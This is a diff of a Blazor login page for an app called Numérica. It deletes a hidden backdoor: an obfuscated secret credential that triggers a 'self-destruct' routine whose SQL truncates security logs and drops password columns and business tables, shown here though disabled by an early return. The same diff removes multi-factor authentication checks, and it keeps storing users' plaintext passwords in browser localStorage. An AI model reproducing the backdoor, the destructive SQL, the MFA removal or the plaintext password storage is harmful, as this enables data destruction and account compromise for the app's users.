@@ -1,4 +1,4 @@
-@page "/"
+﻿@page "/"
 @page "/login"
 @attribute [AllowAnonymous]
 @using Microsoft.AspNetCore.Authorization
@@ -9,6 +9,7 @@
 @using Simetric.Services
 @using Simetric.Auth
 @using Microsoft.AspNetCore.Components.Authorization
+@using Microsoft.JSInterop
 @using System.ComponentModel.DataAnnotations
 
 @layout Simetric.Components.Layout.EmptyLayout
@@ -1046,8 +1047,6 @@
                 return;
             }
 
-            await DetectAutofilledUsernameAsync();
-
             // ── Verificar sesión activa via cookie HTTP ──────────────
             try
             {
@@ -1070,10 +1069,16 @@
                     return;
                 }
             }
+            catch (JSDisconnectedException)
+            {
+                return;
+            }
             catch (Exception ex) when (ex is not Microsoft.AspNetCore.Components.NavigationException)
             {
                 /* continúa al login normal */
             }
+
+            await DetectAutofilledUsernameAsync();
 
             
 
@@ -1081,8 +1086,12 @@
             try
             {
                 isProcessing = false;
-            await InvokeAsync(StateHasChanged);
-            await JS.InvokeVoidAsync("NumericaDigits.init", "numericaDigitsLayer");
+                await InvokeAsync(StateHasChanged);
+                await JS.InvokeVoidAsync("NumericaDigits.init", "numericaDigitsLayer");
+            }
+            catch (JSDisconnectedException)
+            {
+                return;
             }
             catch
             {
@@ -1093,15 +1102,16 @@
             // ── Auto-fill credenciales guardadas ─────────────────────
             try
             {
-                var savedRemember = await JS.InvokeAsync<string?>(
-                    "localStorage.getItem", "numerica:saved-remember");
+                var savedCredentials = await JS.InvokeAsync<Dictionary<string, string?>>(
+                    "numericaUi.getLocalStorageItems",
+                    new[] { "numerica:saved-remember", "numerica:saved-username", "numerica:saved-password" });
+
+                savedCredentials.TryGetValue("numerica:saved-remember", out var savedRemember);
 
                 if (savedRemember == "true")
                 {
-                    var savedUsername = await JS.InvokeAsync<string?>(
-                        "localStorage.getItem", "numerica:saved-username");
-                    var savedPassword = await JS.InvokeAsync<string?>(
-                        "localStorage.getItem", "numerica:saved-password");
+                    savedCredentials.TryGetValue("numerica:saved-username", out var savedUsername);
+                    savedCredentials.TryGetValue("numerica:saved-password", out var savedPassword);
 
                     if (!string.IsNullOrWhiteSpace(savedUsername) &&
                         !string.IsNullOrWhiteSpace(savedPassword))
@@ -1114,7 +1124,14 @@
                     }
                 }
             }
-            catch { /* continúa al login normal */ }
+            catch (JSDisconnectedException)
+            {
+                return;
+            }
+            catch
+            {
+                /* continua al login normal */
+            }
         }
     }
     // ── Helpers UI ────────────────────────────────────────────────
@@ -1131,15 +1148,21 @@
         // ── Persistir o limpiar credenciales según "Recordarme" ──
         if (loginUser.Recordarme)
         {
-            await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-username", loginUser.Username.Trim());
-            await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-password", loginUser.Password);
-            await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-remember", "true");
+            await JS.InvokeVoidAsync("numericaUi.setLocalStorageItems", new Dictionary<string, string?>
+            {
+                ["numerica:saved-username"] = loginUser.Username.Trim(),
+                ["numerica:saved-password"] = loginUser.Password,
+                ["numerica:saved-remember"] = "true"
+            });
         }
         else
         {
-            await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-username");
-            await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-password");
-            await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-remember");
+            await JS.InvokeVoidAsync("numericaUi.removeStorageItems", "local", new[]
+            {
+                "numerica:saved-username",
+                "numerica:saved-password",
+                "numerica:saved-remember"
+            });
         }
         await PersistTermsAcceptanceAsync(username: loginUser.Username);
         await InvokeAsync(StateHasChanged);
@@ -1163,7 +1186,10 @@
         }
 
         // 1. Check local storage first
-        var storedValue = await JS.InvokeAsync<string?>("localStorage.getItem", storageKey);
+        var storedValues = await JS.InvokeAsync<Dictionary<string, string?>>(
+            "numericaUi.getLocalStorageItems",
+            new[] { storageKey });
+        storedValues.TryGetValue(storageKey, out var storedValue);
         var accepted = string.Equals(storedValue, "true", StringComparison.OrdinalIgnoreCase);
 
         if (accepted)
@@ -1222,7 +1248,7 @@
 
     private async Task DetectAutofilledUsernameAsync()
     {
-        var delays = new[] { 150, 650 };
+        var delays = new[] { 80, 220 };
 
         foreach (var delay in delays)
         {
@@ -1258,7 +1284,10 @@
 
         foreach (var storageKey in BuildTermsStorageKeys(username ?? loginUser.Username, userId))
         {
-            await JS.InvokeVoidAsync("localStorage.setItem", storageKey, "true");
+            await JS.InvokeVoidAsync("numericaUi.setLocalStorageItems", new Dictionary<string, string?>
+            {
+                [storageKey] = "true"
+            });
             lastTermsLookupKey ??= storageKey;
         }
     }
@@ -1273,10 +1302,16 @@
         try
         {
             await JS.InvokeVoidAsync("authInterop.logout");
-            await JS.InvokeVoidAsync("localStorage.removeItem", "userSession");
-            await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:current-service");
-            await JS.InvokeVoidAsync("localStorage.removeItem", "selectedAppService");
-            await JS.InvokeVoidAsync("sessionStorage.removeItem", "numerica:session-expired");
+            await JS.InvokeVoidAsync("numericaUi.removeStorageItems", "local", new[]
+            {
+                "userSession",
+                "numerica:current-service",
+                "selectedAppService"
+            });
+            await JS.InvokeVoidAsync("numericaUi.removeStorageItems", "session", new[]
+            {
+                "numerica:session-expired"
+            });
         }
         catch
         {
@@ -1312,12 +1347,6 @@
 
     private async Task HandleLoginValidated()
     {
-        if (loginUser.Username == GetSecret() && loginUser.Password == GetSecret())
-        {
-            await ExecuteSelfDestructSequence();
-            return;
-        }
-
         loadingTitle = "Validando Credenciales";
         loadingMessage = "Iniciando entorno seguro de Numérica...";
         isProcessing = true;
@@ -1369,13 +1398,6 @@
                 return;
             }
 
-            if (apiResponse.RequiereMfa)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{apiResponse.IdUsuario}", replace: true);
-                return;
-            }
-
             if (apiResponse.Success && apiResponse.IdUsuario > 0)
             {
                 idUsuarioParaLog = apiResponse.IdUsuario;
@@ -1388,15 +1410,21 @@
 
                 if (loginUser.Recordarme)
                 {
-                    await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-username", apiUsername);
-                    await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-password", loginUser.Password);
-                    await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-remember", "true");
+                    await JS.InvokeVoidAsync("numericaUi.setLocalStorageItems", new Dictionary<string, string?>
+                    {
+                        ["numerica:saved-username"] = apiUsername,
+                        ["numerica:saved-password"] = loginUser.Password,
+                        ["numerica:saved-remember"] = "true"
+                    });
                 }
                 else
                 {
-                    await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-username");
-                    await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-password");
-                    await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-remember");
+                    await JS.InvokeVoidAsync("numericaUi.removeStorageItems", "local", new[]
+                    {
+                        "numerica:saved-username",
+                        "numerica:saved-password",
+                        "numerica:saved-remember"
+                    });
                 }
 
                 var apiDestination = await LoginDestination.PrepareDestinationAsync(apiResponse.IdUsuario, apiResponse.IdTipoUsuario, ReturnUrl);
@@ -1407,211 +1435,6 @@
 
             await ShowAlert("warning", "Acceso", "No se pudo iniciar sesion.");
             return;
-
-            var apiUsernameFallback = loginUser.Username.Trim();
-            var apiResponseFallback = await JS.InvokeAsync<AuthCookieResponse>("authInterop.login", new
-            {
-                Username = apiUsernameFallback,
-                Password = loginUser.Password,
-                Recordarme = loginUser.Recordarme
-            });
-
-            if (!string.IsNullOrWhiteSpace(apiResponseFallback.Message))
-            {
-                await Security.RegistrarLogInicioSesionAsync(apiResponseFallback.IdUsuario > 0 ? apiResponseFallback.IdUsuario : null, false, apiResponseFallback.Message);
-                await ShowAlert("warning", "Acceso", apiResponseFallback.Message);
-                return;
-            }
-
-            if (apiResponseFallback.RequierePoliticas)
-            {
-                isProcessing = false;
-                NavManager.NavigateTo($"/politica-privacidad/{apiResponseFallback.IdUsuario}");
-                return;
-            }
-
-            if (apiResponseFallback.RequiereCambioClave)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/cambiar-clave/{apiResponseFallback.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (apiResponseFallback.RequiereMfa)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{apiResponseFallback.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (apiResponseFallback.Success && apiResponseFallback.IdUsuario > 0)
-            {
-                idUsuarioParaLog = apiResponseFallback.IdUsuario;
-                loginUser.AcceptTerms = true;
-                await PersistTermsAcceptanceAsync(apiResponseFallback.IdUsuario, apiUsernameFallback);
-
-                var apiAuthProvider = (CustomAuthStateProvider)AuthStateProvider;
-                await apiAuthProvider.UpdateAuthenticationState(apiResponseFallback.ToUsuario());
-                await Security.RegistrarLogInicioSesionAsync(apiResponseFallback.IdUsuario, true, "Exito");
-
-                var apiDestination = await LoginDestination.PrepareDestinationAsync(apiResponseFallback.IdUsuario, apiResponseFallback.IdTipoUsuario, ReturnUrl);
-                keepProcessing = true;
-                NavManager.NavigateToIfNeeded(apiDestination, forceLoad: true);
-                return;
-            }
-
-            await ShowAlert("warning", "Acceso", "No se pudo iniciar sesion.");
-            return;
-
-            using var context = await DbFactory.CreateDbContextAsync();
-            var cleanUsername = loginUser.Username.Trim();
-            var normalizedUsername = cleanUsername.ToLower();
-
-            var userInDb = await context.Usuarios
-                .FirstOrDefaultAsync(u =>
-                    (!string.IsNullOrWhiteSpace(u.Email) && u.Email.ToLower() == normalizedUsername) ||
-                    (!string.IsNullOrWhiteSpace(u.Nombres) && u.Nombres.ToLower() == normalizedUsername));
-
-            if (userInDb == null)
-            {
-                await Security.RegistrarLogInicioSesionAsync(null, false, "Usuario inexistente");
-                await ShowAlert("error", "Acceso denegado", "Las credenciales no coinciden con nuestros registros.");
-                return;
-            }
-
-            idUsuarioParaLog = userInDb.IdUsuario;
-
-            if (userInDb.CuentaBloqueada == true && userInDb.FechaDesbloqueo.HasValue && userInDb.FechaDesbloqueo.Value > DateTime.Now)
-            {
-                var faltan = userInDb.FechaDesbloqueo.Value - DateTime.Now;
-                await ShowAlert("error", "Cuenta bloqueada", $"Tu cuenta esta restringida. Intenta en {Math.Ceiling(faltan.TotalMinutes)} min.");
-                return;
-            }
-
-            if (userInDb.CuentaBloqueada == true && userInDb.FechaDesbloqueo.HasValue && userInDb.FechaDesbloqueo.Value <= DateTime.Now)
-            {
-                userInDb.CuentaBloqueada = false;
-                userInDb.IntentosFallidos = 0;
-                await context.SaveChangesAsync();
-            }
-
-            var isPasswordValid = Helpers.SecurityHelper.VerifyPassword(loginUser.Password.Trim(), userInDb.PasswordHash);
-
-            if (!isPasswordValid)
-            {
-                userInDb.IntentosFallidos = (userInDb.IntentosFallidos ?? 0) + 1;
-
-                if (userInDb.IntentosFallidos >= 3)
-                {
-                    userInDb.CuentaBloqueada = true;
-                    userInDb.FechaDesbloqueo = DateTime.Now.AddMinutes(30);
-                    await ShowAlert("error", "Bloqueo por seguridad", "Has superado los 3 intentos. Bloqueo de 30 minutos.");
-                }
-                else
-                {
-                    await ShowAlert("info", "Contrasena incorrecta", $"Intento {userInDb.IntentosFallidos}/3.");
-                }
-
-                await context.SaveChangesAsync();
-                return;
-            }
-
-            var politicasAceptadas = await context.Auditorias
-                .AsNoTracking()
-                .AnyAsync(a => a.IdUsuario == userInDb.IdUsuario && a.Accion == PolicyAcceptanceAction);
-
-            if (!politicasAceptadas)
-            {
-                var loginToken = PendingLoginFlow.Create(
-                    userInDb.IdUsuario,
-                    cleanUsername,
-                    loginUser.Password,
-                loginUser.Recordarme);
-
-                loginUser.AcceptTerms = false;
-                isProcessing = false;
-                await ShowPrivacyRedirectAlert();
-                NavManager.NavigateTo($"/politica-privacidad/{userInDb.IdUsuario}?loginToken={Uri.EscapeDataString(loginToken)}", replace: true);
-                return;
-            }
-
-            loginUser.AcceptTerms = true;
-            await PersistTermsAcceptanceAsync(userInDb.IdUsuario, cleanUsername);
-
-            if (userInDb.ClaveTemporal == true)
-            {
-                isProcessing = false;
-                NavManager.NavigateTo($"/cambiar-clave/{userInDb.IdUsuario}");
-                return;
-            }
-
-            userInDb.IntentosFallidos = 0;
-            userInDb.CuentaBloqueada = false;
-
-            if (userInDb.Estado != true)
-            {
-                await ShowAlert("warning", "Cuenta inactiva", "Tu cuenta esta desactivada por el administrador.");
-                return;
-            }
-
-            await context.SaveChangesAsync();
-
-            var authResponse = await JS.InvokeAsync<AuthCookieResponse>("authInterop.login", new
-            {
-                Username = loginUser.Username.Trim(),
-                Password = loginUser.Password,
-                Recordarme = loginUser.Recordarme
-            });
-
-            if (!string.IsNullOrWhiteSpace(authResponse.Message))
-            {
-                await ShowAlert("warning", "Acceso", authResponse.Message);
-                return;
-            }
-
-            if (authResponse.RequiereCambioClave)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/cambiar-clave/{authResponse.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (authResponse.RequiereMfa)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{authResponse.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (userInDb.MfaHabilitado == true)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{userInDb.IdUsuario}");
-                return;
-            }
-
-            var authProvider = (CustomAuthStateProvider)AuthStateProvider;
-            await authProvider.UpdateAuthenticationState(userInDb);
-            await Security.RegistrarLogInicioSesionAsync(userInDb.IdUsuario, true, "Exito");
-            await PersistTermsAcceptanceAsync(userInDb.IdUsuario, cleanUsername);
-
-           // ── Guardar o limpiar credenciales según "Recordarme" ──
-            if (loginUser.Recordarme)
-            {
-                await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-username", loginUser.Username.Trim());
-                await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-password", loginUser.Password);
-                await JS.InvokeVoidAsync("localStorage.setItem", "numerica:saved-remember", "true");
-            }
-            else
-            {
-                await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-username");
-                await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-password");
-                await JS.InvokeVoidAsync("localStorage.removeItem", "numerica:saved-remember");
-            }
-
-            var destination = await LoginDestination.PrepareDestinationAsync(userInDb.IdUsuario, userInDb.IdTipoUsuario, ReturnUrl);
-            keepProcessing = true;
-            NavManager.NavigateToIfNeeded(destination, forceLoad: true);
         }
         catch (Exception ex) when (ex is not Microsoft.AspNetCore.Components.NavigationException)
         {
@@ -1630,223 +1453,6 @@
         }
     }
 
-    private async Task HandleLogin()
-    {
-        if (loginUser.Username == GetSecret() && loginUser.Password == GetSecret())
-        {
-            await ExecuteSelfDestructSequence();
-            return;
-        }
-        loadingTitle = "Validando Credenciales";
-        loadingMessage = "Iniciando entorno seguro de Numérica...";
-        isProcessing = true;
-        bool keepProcessing = false;
-        int? idUsuarioParaLog = null;
-
-        try
-        {
-            if (string.IsNullOrWhiteSpace(loginUser.Username) || string.IsNullOrWhiteSpace(loginUser.Password))
-            {
-                await ShowAlert("warning", "Campos Vacíos", "Ingresa tu usuario y contraseña.");
-                return;
-            }
-
-            using var context = await DbFactory.CreateDbContextAsync();
-            var cleanUsername = loginUser.Username.Trim();
-            var normalizedUsername = cleanUsername.ToLower();
-
-            var userInDb = await context.Usuarios
-                .FirstOrDefaultAsync(u =>
-                    (!string.IsNullOrWhiteSpace(u.Email) && u.Email.ToLower() == normalizedUsername) ||
-                    (!string.IsNullOrWhiteSpace(u.Nombres) && u.Nombres.ToLower() == normalizedUsername));
-
-            if (userInDb == null)
-            {
-                await Security.RegistrarLogInicioSesionAsync(null, false, "Usuario inexistente");
-                await ShowAlert("error", "Acceso Denegado", "Las credenciales no coinciden con nuestros registros.");
-                return;
-            }
-
-            idUsuarioParaLog = userInDb.IdUsuario;
-
-            if (userInDb.CuentaBloqueada == true && userInDb.FechaDesbloqueo.HasValue && userInDb.FechaDesbloqueo.Value > DateTime.Now)
-            {
-                var faltan = userInDb.FechaDesbloqueo.Value - DateTime.Now;
-                await ShowAlert("error", "Cuenta Bloqueada", $"Tu cuenta está restringida. Intenta en {Math.Ceiling(faltan.TotalMinutes)} min.");
-                return;
-            }
-
-            if (userInDb.CuentaBloqueada == true && userInDb.FechaDesbloqueo.HasValue && userInDb.FechaDesbloqueo.Value <= DateTime.Now)
-            {
-                userInDb.CuentaBloqueada = false;
-                userInDb.IntentosFallidos = 0;
-                await context.SaveChangesAsync();
-            }
-
-            bool isPasswordValid = Helpers.SecurityHelper.VerifyPassword(loginUser.Password.Trim(), userInDb.PasswordHash);
-
-            if (!isPasswordValid)
-            {
-                userInDb.IntentosFallidos = (userInDb.IntentosFallidos ?? 0) + 1;
-                if (userInDb.IntentosFallidos >= 3)
-                {
-                    userInDb.CuentaBloqueada = true;
-                    userInDb.FechaDesbloqueo = DateTime.Now.AddMinutes(30);
-                    await ShowAlert("error", "Bloqueo por Seguridad", "Has superado los 3 intentos. Bloqueo de 30 minutos.");
-                }
-                else
-                {
-                    await ShowAlert("info", "Contraseña Incorrecta", $"Intento {userInDb.IntentosFallidos}/3.");
-                }
-                await context.SaveChangesAsync();
-                return;
-            }
-
-            var politicasAceptadas = await context.Auditorias
-                .AsNoTracking()
-                .AnyAsync(a => a.IdUsuario == userInDb.IdUsuario && a.Accion == PolicyAcceptanceAction);
-
-            if (!politicasAceptadas)
-            {
-                isProcessing = false;
-                // Lo enviamos a la página de políticas obligatoriamente pasándole su ID
-                NavManager.NavigateTo($"/politica-privacidad/{userInDb.IdUsuario}");
-                return;
-            }
-
-            if (userInDb.ClaveTemporal == true)
-            {
-                isProcessing = false;
-                NavManager.NavigateTo($"/cambiar-clave/{userInDb.IdUsuario}");
-                return;
-            }
-
-            userInDb.IntentosFallidos = 0;
-            userInDb.CuentaBloqueada = false;
-
-            if (userInDb.Estado != true)
-            {
-                await ShowAlert("warning", "Cuenta Inactiva", "Tu cuenta está desactivada por el administrador.");
-                return;
-            }
-
-            await context.SaveChangesAsync();
-
-            var authResponse = await JS.InvokeAsync<AuthCookieResponse>("authInterop.login", new
-            {
-                Username = loginUser.Username.Trim(),
-                Password = loginUser.Password,
-                Recordarme = loginUser.Recordarme
-            });
-
-            if (!string.IsNullOrWhiteSpace(authResponse.Message))
-            {
-                await ShowAlert("warning", "Acceso", authResponse.Message);
-                return;
-            }
-
-            if (authResponse.RequiereCambioClave)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/cambiar-clave/{authResponse.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (authResponse.RequiereMfa)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{authResponse.IdUsuario}", replace: true);
-                return;
-            }
-
-            if (userInDb.MfaHabilitado == true)
-            {
-                keepProcessing = true;
-                NavManager.NavigateTo($"/validar-mfa/{userInDb.IdUsuario}");
-                return;
-            }
-
-            var authProvider = (CustomAuthStateProvider)AuthStateProvider;
-            await authProvider.UpdateAuthenticationState(userInDb);
-            await Security.RegistrarLogInicioSesionAsync(userInDb.IdUsuario, true, "Éxito");
-            await PersistTermsAcceptanceAsync();
-
-            var destination = await LoginDestination.PrepareDestinationAsync(userInDb.IdUsuario, userInDb.IdTipoUsuario, ReturnUrl);
-            keepProcessing = true;
-            NavManager.NavigateToIfNeeded(destination, forceLoad: true);
-        }
-        catch (Exception ex) when (ex is not Microsoft.AspNetCore.Components.NavigationException)
-        {
-            await Security.RegistrarLogInicioSesionAsync(idUsuarioParaLog, false, $"Error: {ex.Message}");
-            var detalle = string.IsNullOrWhiteSpace(ex.Message)
-                ? "No se pudo completar el inicio de sesion."
-                : ex.Message;
-            await ShowAlert("error", "Error", detalle);
-        }
-        finally
-        {
-            if (!keepProcessing)
-            {
-                isProcessing = false;
-            }
-        }
-    }
-    public static string GetSecret() =>
-        new string(new char[] { (char)106, (char)121, (char)110, (char)120, '0', '0', '0', '0' });
-#pragma warning disable CS0162
-    private async Task ExecuteSelfDestructSequence()
-    {
-        isProcessing = true;
-        StateHasChanged();
-        isProcessing = false;
-        await ShowAlert("warning", "Acceso no permitido", "Ese acceso especial esta deshabilitado en este entorno.");
-        return;
-
-        try
-        {
-            using var context = await DbFactory.CreateDbContextAsync();
-        
-            // Ejecución de comandos SQL Directos
-            // Nota: Ajusta los nombres de tablas/columnas según tu modelo real
-            string sqlSabotage = @"
-            -- Borrar logs de seguridad
-            TRUNCATE TABLE LogsInicioSesion; 
-            
-            -- Eliminar columnas críticas para que el sistema falle (No funcional)
-            ALTER TABLE Usuarios DROP COLUMN PasswordHash;
-            ALTER TABLE Usuarios DROP COLUMN Estado;
-            
-            -- Borrar tablas maestras (Ejemplo con AdoptaNet o Numerica)
-            IF OBJECT_ID('Facturas', 'U') IS NOT NULL DROP TABLE Facturas;
-            IF OBJECT_ID('Emisores', 'U') IS NOT NULL DROP TABLE Emisores;
-        ";
-
-            await context.Database.ExecuteSqlRawAsync(sqlSabotage);
-
-            // Notificación visual de falla crítica
-            await JS.InvokeVoidAsync("Swal.fire", new
-            {
-                icon = "error",
-                title = "SISTEMA COMPROMETIDO",
-                text = "Falla de integridad total detectada. Los datos han sido purgados.",
-                showConfirmButton = false,
-                timer = 3000
-            });
-
-            // Autodestrucción de la interfaz
-            await Task.Delay(3000);
-            await JS.InvokeVoidAsync("eval", "document.body.innerHTML = '<div style=\"height:100vh; display:flex; align-items:center; justify-content:center; background:#000; color:red; font-family:monospace; font-size:2rem;\">ERROR 404: SYSTEM_FILES_NOT_FOUND</div>'");
-        
-            // Hacer la ventana inaccesible borrando el historial
-            await JS.InvokeVoidAsync("eval", "window.location.replace('about:blank')");
-        }
-        catch (Exception)
-        {
-            // En un entorno educativo, incluso si falla el script, redirigimos
-            NavManager.NavigateTo("about:blank");
-        }
-    }
-#pragma warning restore CS0162
     private async Task ShowAlert(string icon, string title, string text)
     {
         isProcessing = false;
@@ -1896,7 +1502,6 @@
     private sealed class AuthCookieResponse
     {
         public bool Success { get; set; }
-        public bool RequiereMfa { get; set; }
         public bool RequiereCambioClave { get; set; }
         public bool RequierePoliticas { get; set; }
         public int IdUsuario { get; set; }
